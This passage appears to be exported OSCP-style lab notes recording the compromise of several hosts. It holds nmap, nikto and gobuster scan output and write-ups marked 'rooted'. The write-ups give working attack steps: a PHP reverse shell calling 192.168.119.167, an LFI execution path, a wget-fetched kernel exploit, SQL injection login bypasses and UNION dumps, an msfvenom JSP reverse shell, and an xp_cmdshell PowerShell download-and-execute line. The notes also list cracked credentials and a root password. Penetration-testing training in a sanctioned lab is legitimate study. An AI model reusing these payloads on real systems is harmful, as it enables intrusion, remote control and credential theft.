LOGIN-REFERRALS STARTTLS<br />|_ssl-date: 2020-05-07T23:11:48+00:00; -1m26s from scanner time.<br />199/tcp   open  smux        Linux SNMP multiplexer<br />443/tcp   open  ssl/https   Apache/2.0.40 (Red Hat Linux)<br />|_http-server-header: Apache/2.0.40 (Red Hat Linux)<br />|_http-title: Bad request!<br />|_ssl-date: 2020-05-07T23:11:34+00:00; -1m25s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />3306/tcp  open  mysql       MySQL (unauthorized)<br />32768/tcp open  status      1 (RPC #100024)<br />Service Info: Host: tophat.acme.local; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -1m25s, deviation: 0s, median: -1m26s<br />|_nbstat: NetBIOS name: TOPHAT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 274.93 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 19:14 EDT<br />Nmap scan report for 10.11.1.115<br />Host is up (0.065s latency).<br />Not shown: 65524 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />22/tcp    open  ssh<br />25/tcp    open  smtp<br />80/tcp    open  http<br />111/tcp   open  rpcbind<br />139/tcp   open  netbios-ssn<br />143/tcp   open  imap<br />199/tcp   open  smux<br />443/tcp   open  https<br />3306/tcp  open  mysql<br />32768/tcp open  filenet-tms<br /><br />Nmap done: 1 IP address (1 host up) scanned in 346.72 seconds<br /></div><div class='page'><h1 class='title level-6'>smb vuln nmap</h1><br/>PORT    STATE  SERVICE      REASON<br />139/tcp open   netbios-ssn  syn-ack<br />445/tcp closed microsoft-ds conn-refused<br /><br />Host script results:<br />| smb-vuln-cve2009-3103: <br />|   VULNERABLE:<br />|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2009-3103<br />|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,<br />|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a<br />|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE<br />|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,<br />|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;<br />|           <br />|     Disclosure date: 2009-09-08<br />|     References:<br />|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103<br />|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]<br /><br /></div><div class='page'><h1 class='title level-6'>web</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.0.40 ((Red Hat Linux))<br />|_http-server-header: Apache/2.0.40 (Red Hat Linux)<br /><br />PORT    STATE SERVICE   REASON  VERSION<br />443/tcp open  ssl/https syn-ack Apache/2.0.40 (Red Hat Linux)<br />|_http-server-header: Apache/2.0.40 (Red Hat Linux)<br /></div><div class='page'><h1 class='title level-6'>80 nikto</h1><br/>nikto -host http://10.11.1.115:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.115<br />+ Target Hostname:    10.11.1.115<br />+ Target Port:        80<br />+ Start Time:         2020-05-08 09:29:11 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.0.40 (Red Hat Linux)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var<br />+ Apache/2.0.40 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-2672: Apache/2.0.40 - &quot;Apache 2.0 up 2.0.46 are vulnerable to multiple remote problems. CAN-2003-0192. CAN-2003-0253. CAN-2003-0254. CERT VU<br />+ OSVDB-15889: Apache/2.0.40 - Apache 2.0 up 2.0.47 are vulnerable to multiple remote problems in mod_rewrite and mod_cgi. CAN-2003-0789. CAN-2003-0542.<br />+ OSVDB-9994: Apache/2.0.40 (Red Hat Linux - Apache 2.0 to 2.0.51 contain multiple problems: overflow in apr-util (OSVDB-9994), config file variable overflow (OSVDB-9991), indirect lock refresh DoS (OSVDB-9948), SSL input filter DoS (OSVDB-9742), potential infinite loop (OSVDB-9523).<br />+ OSVDB-10218: Apache/2.0.40 (Red Hat Linux - Apache 2.0 to 2.0.52 could allow bypassing of authentication via the Satisfy directive. CAN-2004-0811. OSVDB-10218.<br />+ OSVDB-10637: Apache/2.0.40 (Red Hat Linux - Apache 2.0 to 2.0.53 allows bypassing of an SSLCipherSuite setting. CAN-2004-0885. OSVDB-10637. Also contains a memory exhaustion DoS through MIME folded requests. CAN-2004-0942. OSVDB-11391<br />+ OSVDB-6472: Apache/2.0.40 (Red Hat Linux - Apache 2.0 to 2.0.50 contain a buffer overflow in FakeBasicAuth with trusted client certificates. CAN-2004-0488. OSVDB-6472. Also a DoS with certain input data. CAN-2004-0493. OSVDB-7269.<br />+ Apache/2.0.40 - Apache versions 2.0.37 through 2.0.45 are vulnerable to a DoS in mod_dav. CAN-2003-0245.<br />+ Apache/2.0.40 (Red Hat Linux - Apache 2.0 to 2.0.49: memory leak in plain-HTTP-on-SSL-port handling (OSVDB-4182), a DoS with short-lived connections on rarely-accessed sockets (OSVDB-4383), and may allow unescaped data into logfiles (OSVDB-4382).<br />+ Apache/2.0.40 - Apache versions 2.0.40 through 2.0.45 are vulnerable to a DoS in basic authentication. CAN-2003-0189.<br />+ Retrieved x-powered-by header: PHP/4.2.2<br />+ OSVDB-3268: //: Directory indexing found.<br />+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.<br />+ OSVDB-3268: ///: Directory indexing found.<br />+ Server may leak inodes via ETags, header found with file /usage/, inode: 306887, size: 4849, mtime: Sun May 21 21:29:36 1978<br />+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).<br />+ Uncommon header &#39;tcn&#39; found, with contents: choice<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ Cookie SQMSESSID created without the httponly flag<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3268: /manual/images/: Directory indexing found.<br />+ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.<br />+ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /&#39;s are requested.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8725 requests: 1 error(s) and 30 item(s) reported on remote host<br />+ End Time:           2020-05-08 09:49:46 (GMT-4) (1235 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1025-1.png" alt="images/1025-1.png" /></a><br /><br /><a href=""><img src="images/1025-2.png" alt="images/1025-2.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.116 dotty rooted</h1><br/>Nmap showed that port 80 was the only truly juicy port.<br />dir busting gave me the directories db and administrator.<br /><br />db led me to phpLiteAdmin, which I was able to log onto via default creds (admin)<br />phpLiteAdminv1.9.3 is vulnerable to a php upload and execution normally, but I could only upload the php files. (The files were being uploaded to a non-standard directory)<br /><br />administrator led me to Cuppa CMS  which is vulnerable to a LFI vulnerability. (Cuppa default creds login admin:admin<br />I uploaded a php rev shell via phpLiteAdmin and then executed it via the LFI on Cuppa CMS<br /><br />once I had a shell uname -a showed me that the machine was      4.4.0-116-generic<br />searchsploit told me that 44298.c would do the trick! (kernel exploit)<br />    gcc 44298.c -o 44298.exe<br />    wget <a href="http://192.168.119.167:80/44298.exe">http://192.168.119.167:80/44298.exe</a><br />    chmod +x 44298.exe<br />    ./44298.exe<br />    whoami<br />    root!<br />    <br /><br /><br />In order to leverage the phpLiteAdmin v1.9.3 file upload I needed to...<br />    create new database (yeet.php) &gt; create new table (yeet) number of fields (1) &gt; field = yeet type=TEXT defaultfalue=&lt;?php $sock=fsockopen(&quot;192.168.119.167&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;<br />    <a href="https://www.youtube.com/watch?v=G1i5oWblx9Q">https://www.youtube.com/watch?v=G1i5oWblx9Q</a>    <br />    <br />In Cuppa I was able to execute it by navigating to http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../usr/local/databases/yeet.php<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />f96fa30b9bc142e9d5c3649b055c28de<br /></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>Ubuntu Xenial 2016<br /><br />admin:admin<br />root:99bbVDdorGzfZJun<br /><br /><br /><br />&lt;?php $sock=fsockopen(&quot;192.168.119.167&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;</div><div class='page'><h1 class='title level-5'>dir bust</h1><br/>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.11.1.116:80 &amp;&amp; gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.11.1.116:80<br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            http://10.11.1.116:80<br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/05/08 14:56:39 Starting gobuster<br />===============================================================<br />/.hta (Status: 403)<br />/.htpasswd (Status: 403)<br />/.htaccess (Status: 403)<br />/administrator (Status: 301)<br />/db (Status: 301)<br />/index.html (Status: 200)<br />/server-status (Status: 403)<br />===============================================================</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.116 &amp;&amp; nmap -sC -sV -Pn 10.11.1.116 &amp;&amp; nmap -p- -Pn 10.11.1.116 &amp;&amp; nmap -Pn -p- -sU 10.11.1.116<br />ttl=63<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 14:53 EDT<br />Nmap scan report for 10.11.1.116<br />Host is up (0.066s latency).<br />Not shown: 995 closed ports<br />PORT    STATE SERVICE<br />21/tcp  open  ftp<br />22/tcp  open  ssh<br />80/tcp  open  http<br />110/tcp open  pop3<br />143/tcp open  imap<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 14:53 EDT<br />Nmap scan report for 10.11.1.116<br />Host is up (0.071s latency).<br />Not shown: 995 closed ports<br />PORT    STATE SERVICE    VERSION<br />21/tcp  open  ftp        vsftpd 3.0.3<br />22/tcp  open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 86:88:7a:3f:91:95:26:ff:1a:d1:64:44:39:ea:8c:1a (RSA)<br />|   256 07:62:18:a5:a3:89:2f:3e:91:d9:06:c2:ea:37:cc:23 (ECDSA)<br />|_  256 c2:be:a4:4f:01:a1:71:fb:b2:0c:3a:3e:a4:c8:56:51 (ED25519)<br />80/tcp  open  http       Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Dotty<br />110/tcp open  tcpwrapped<br />143/tcp open  tcpwrapped<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 14:54 EDT<br />Nmap scan report for 10.11.1.116<br />Host is up (0.090s latency).<br />Not shown: 65530 closed ports<br />PORT    STATE SERVICE<br />21/tcp  open  ftp<br />22/tcp  open  ssh<br />80/tcp  open  http<br />110/tcp open  pop3<br />143/tcp open  imap<br /><br />Nmap done: 1 IP address (1 host up) scanned in 81.06 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-5'>creds</h1><br/>aaron<br />5978a63b4654c73c60fa24f836386d87<br />accasia<br />a1420fc5ab116437368889400c4bb8e1<br />bethanyjoy02<br />6c0f3fde58158e4c1f4cedb29c7ef4c1<br />deanna<br />f463f63616cb3f1e81ce46b39f882fd5<br />jpotter<br />9b38e2b1e8b12f426b0d208a7ab6cb98</div><div class='page'><h1 class='title level-4'>PIctures</h1><br/><a href=""><img src="images/1033-1.png" alt="images/1033-1.png" /></a><br /><br /><a href=""><img src="images/1033-2.png" alt="images/1033-2.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.222 Chris rooted</h1><br/>Nmap showed that http was open on port 8080<br />Dirb showed the directory /blog/ that hosted a link to login.jsp<br />if you put the following in the username and password fields you would be authenticated<br />    username=&#39; or &#39;1&#39;=&#39;1<br />    password=&#39; or &#39;1&#39;=&#39;1<br />capture the post from the next screen in burp and copy-pasteing the output to post2.txt.<br />sqlmap -r post2.txt -p author --risk=3 --level=5 --dbs --dump<br />all databases are dumped and the creds admin/adminadmin are cracked!<br />Logging in as admin allows you to upload files!<br />use msfvenom to make shellcode<br />    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f raw &gt; 443.jsp<br />enjoy rev shell as nt authority/system<br /><br />48ef4c1bb19a7e49c5961ce1a064f0f1<br /><br /><br /> a&#39; union SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;--<br /> a&#39; SELECT login || &#39;-&#39; || password FROM members</div><div class='page'><h1 class='title level-4'>Manual writeup</h1><br/>a&#39; UNION SELECT banner, NULL, NULL FROM v$version--<br /><a href=""><img src="images/1047-1.png" alt="images/1047-1.png" /></a><br /><br />a&#39; UNION SELECT DISTINCT owner, NULL, NULL FROM all_tables--<br /><a href=""><img src="images/1047-2.png" alt="images/1047-2.png" /></a><br /><br />a&#39; UNION SELECT owner, table_name, NULL FROM all_tab_columns WHERE column_name LIKE &#39;%PASS%&#39;--<br /><a href=""><img src="images/1047-3.png" alt="images/1047-3.png" /></a><br /><br />a&#39; UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = &#39;WEB_ADMINS&#39;--<br /><a href=""><img src="images/1047-4.png" alt="images/1047-4.png" /></a><br /><br />a&#39; UNION SELECT ADMIN_NAME,NULL,NULL FROM WEB_ADMINS--<br /><a href=""><img src="images/1047-5.png" alt="images/1047-5.png" /></a><br /><br />a&#39; UNION SELECT PASSWORD,NULL,NULL FROM WEB_ADMINS--<br /><a href=""><img src="images/1047-6.png" alt="images/1047-6.png" /></a><br /><br />crackstation.net<br /><a href=""><img src="images/1047-7.png" alt="images/1047-7.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>Domain CHRIS<br />name    CHRIS<br />x64<br /><br /><br /><br /><br />username=&#39; or &#39;1&#39;=&#39;1<br />password=&#39; or &#39;1&#39;=&#39;1<br /><a href="https://www.binarytides.com/using-sqlmap-with-login-forms/">https://www.binarytides.com/using-sqlmap-with-login-forms/</a><br /><br />users<br />Chris<br />Bob<br />Alice<br />Maria<br />Eric<br />Blog entry from Chris with title The Great Escape from 2017&lt;BR&gt;<br />Blog entry from Bob with title I Love Crypto from 2016&lt;BR&gt;<br />Blog entry from Alice with title Man-in-the-middle from 2018&lt;BR&gt;<br />Blog entry from Chris with title To Paris and Back from 2019&lt;BR&gt;<br />Blog entry from Maria with title Software Development Lifecycle from 2018&lt;BR&gt;<br />Blog entry from Eric with title Accounting is Fun from 2019&lt;BR&gt;<br /><br /><br /><br /><br /><br />Uploaded Filename: C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\blog\443.jsp</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.222 &amp;&amp; nmap -sC -sV -Pn 10.11.1.222 &amp;&amp; nmap -p- -Pn 10.11.1.222<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 12:16 EDT<br />Nmap scan report for 10.11.1.222<br />Host is up (0.062s latency).<br />Not shown: 992 closed ports<br />PORT     STATE SERVICE<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />1521/tcp open  oracle<br />2030/tcp open  device2<br />3389/tcp open  ms-wbt-server<br />8009/tcp open  ajp13<br />8080/tcp open  http-proxy<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.27 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 12:16 EDT<br />Nmap scan report for 10.11.1.222<br />Host is up (0.058s latency).<br />Not shown: 992 closed ports<br />PORT     STATE SERVICE            VERSION<br />135/tcp  open  msrpc              Microsoft Windows RPC<br />139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn<br />445/tcp  open  microsoft-ds?<br />1521/tcp open  oracle-tns         Oracle TNS listener 1.2.0.0.0 (unauthorized)<br />2030/tcp open  oracle-mts         Oracle MTS Recovery Service<br />3389/tcp open  ssl/ms-wbt-server?<br />| ssl-cert: Subject: commonName=chris<br />| Not valid before: 2020-04-18T12:06:13<br />|_Not valid after:  2020-10-18T12:06:13<br />|_ssl-date: 2020-05-07T16:15:42+00:00; -2m02s from scanner time.<br />8009/tcp open  ajp13              Apache Jserv (Protocol v1.3)<br />| ajp-methods: <br />|_  Supported methods: GET HEAD POST OPTIONS<br />8080/tcp open  http               Apache Tomcat 9.0.19<br />|_http-favicon: Apache Tomcat<br />|_http-title: Apache Tomcat/9.0.19<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m02s, deviation: 0s, median: -2m02s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-07T16:15:41<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 98.37 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 12:17 EDT<br />Nmap scan report for 10.11.1.222<br />Host is up (0.090s latency).<br />Not shown: 65515 closed ports<br />PORT      STATE SERVICE<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1521/tcp  open  oracle<br />2030/tcp  open  device2<br />2233/tcp  open  infocrypt<br />3389/tcp  open  ms-wbt-server<br />5985/tcp  open  wsman<br />8009/tcp  open  ajp13<br />8080/tcp  open  http-proxy<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49668/tcp open  unknown<br />49669/tcp open  unknown<br />49670/tcp open  unknown<br />49684/tcp open  unknown<br />49703/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 114.72 seconds<br /></div><div class='page'><h1 class='title level-5'>web</h1><br/>PORT     STATE SERVICE REASON          VERSION<br />8080/tcp open  http    syn-ack ttl 127 Apache Tomcat 9.0.19<br /></div><div class='page'><h1 class='title level-5'>oracle</h1><br/>root@CoolHandKali:/Yeet/Machines/OSCP/222# nmap --script=oracle-sid-brute -p 1521 10.11.1.222<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 12:24 EDT<br />Nmap scan report for 10.11.1.222<br />Host is up (0.064s latency).<br /><br />PORT     STATE SERVICE<br />1521/tcp open  oracle<br />| oracle-sid-brute: <br />|_  XE<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>nikto -host http://10.11.1.222:8080<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.222<br />+ Target Hostname:    10.11.1.222<br />+ Target Port:        8080<br />+ Start Time:         2020-05-07 12:21:50 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: No banner retrieved<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community<br />+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS <br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-3233: /manager/manager-howto.html: Tomcat documentation found.<br />+ /manager/html: Default Tomcat Manager / Host Manager interface found<br />+ /manager/status: Default Tomcat Server Status interface found<br />+ 7917 requests: 0 error(s) and 10 item(s) reported on remote host<br />+ End Time:           2020-05-07 12:33:06 (GMT-4) (676 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1014-1.png" alt="images/1014-1.png" /></a><br /><br /><a href=""><img src="images/1014-2.png" alt="images/1014-2.png" /></a><br /><br /><a href=""><img src="images/1014-3.png" alt="images/1014-3.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.128 DJ rooted</h1><br/>a&#39; union select name,NULL from syscolumns where id=(select id from sysobjects where name=&#39;users&#39;);--<br /><a href=""><img src="images/1039-1.png" alt="images/1039-1.png" /></a><br /><br />a&#39; union select name,id from users;--<br /><a href=""><img src="images/1039-2.png" alt="images/1039-2.png" /></a><br /><br />a&#39; union select pass,id from users;--<br /><a href=""><img src="images/1039-3.png" alt="images/1039-3.png" /></a><br /><br />a&#39; union select name,NULL from master..syslogins; exec xp_cmdshell &quot;powershell iex (new-object net.webclient).downloadstring(&#39;http://192.168.119.167/443.ps1&#39;)&quot;-- <br /><a href=""><img src="images/1039-4.png" alt="images/1039-4.png" /></a><br /><br /><br />3ea3bb71d63b5804fc65287cb26e9cc8<br /><br /></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>x64<br /> <a href="https://en.wikipedia.org/wiki/Windows_Server_2012_R2">Windows Server 2012 R2</a> and <a href="https://en.wikipedia.org/wiki/Windows_8.1">Windows 8.1</a>.<br /> <br /> <br />creds<br />peter<br />    123pass123<br />alice<br />    password<br />brett<br />    mypassword<br />eric<br />    123pass123<br />    <br />    <br />    <br />    <br />echo ‘IEX(new-object net.webclient).downloadstring(&quot;http://192.168.119.167:80/443.ps1&quot;)’ | powershell.exe</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:16 EDT<br />Nmap scan report for 10.11.1.128<br />Host is up (0.079s latency).<br />Not shown: 985 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.59 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:16 EDT<br />Nmap scan report for 10.11.1.128<br />Host is up (0.058s latency).<br />Not shown: 985 closed ports<br />PORT      STATE SERVICE            VERSION<br />21/tcp    open  ftp                Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_03-14-19  01:58AM             54030608 FoxitReader901_enu_Setup_Prom.exe<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />135/tcp   open  msrpc              Microsoft Windows RPC<br />139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM<br />| ms-sql-ntlm-info: <br />|   Target_Name: DJ<br />|   NetBIOS_Domain_Name: DJ<br />|   NetBIOS_Computer_Name: DJ<br />|   DNS_Domain_Name: dj<br />|   DNS_Computer_Name: dj<br />|_  Product_Version: 6.3.9600<br />| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br />| Not valid before: 2020-03-03T19:46:59<br />|_Not valid after:  2050-03-03T19:46:59<br />|_ssl-date: 2020-05-09T15:15:56+00:00; -2m20s from scanner time.<br />3389/tcp  open  ssl/ms-wbt-server?<br />| rdp-ntlm-info: <br />|   Target_Name: DJ<br />|   NetBIOS_Domain_Name: DJ<br />|   NetBIOS_Computer_Name: DJ<br />|   DNS_Domain_Name: dj<br />|   DNS_Computer_Name: dj<br />|   Product_Version: 6.3.9600<br />|_  System_Time: 2020-05-09T15:15:45+00:00<br />| ssl-cert: Subject: commonName=dj<br />| Not valid before: 2020-01-20T19:48:25<br />|_Not valid after:  2020-07-21T19:48:25<br />5800/tcp  open  http-proxy         sslstrip<br />|_http-title: TightVNC desktop [dj]<br />5900/tcp  open  vnc                VNC (protocol 3.8)<br />|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br />|_ssl-date: ERROR: Script execution failed (use -d to debug)<br />|_sslv2: ERROR: Script execution failed (use -d to debug)<br />|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br />|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br />|_vnc-info: ERROR: Script execution failed (use -d to debug)<br />49152/tcp open  msrpc              Microsoft Windows RPC<br />49153/tcp open  msrpc              Microsoft Windows RPC<br />49154/tcp open  msrpc              Microsoft Windows RPC<br />49155/tcp open  msrpc              Microsoft Windows RPC<br />49156/tcp open  msrpc              Microsoft Windows RPC<br />49157/tcp open  msrpc              Microsoft Windows RPC<br />49158/tcp open  msrpc              Microsoft Windows RPC<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m20s, deviation: 0s, median: -2m20s<br />| ms-sql-info: <br />|   10.11.1.128:1433: <br />|     Version: <br />|       name: Microsoft SQL Server 2012 RTM<br />|       number: 11.00.2100.00<br />|       Product: Microsoft SQL Server 2012<br />|       Service pack level: RTM<br />|       Post-SP patches applied: false<br />|_    TCP port: 1433<br />|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)<br />| smb-security-mode: <br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-09T15:15:49<br />|_  start_date: 2020-03-03T19:46:59<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 87.06 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:18 EDT<br />Nmap scan report for 10.11.1.128<br />Host is up (0.071s latency).<br />Not shown: 65517 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br 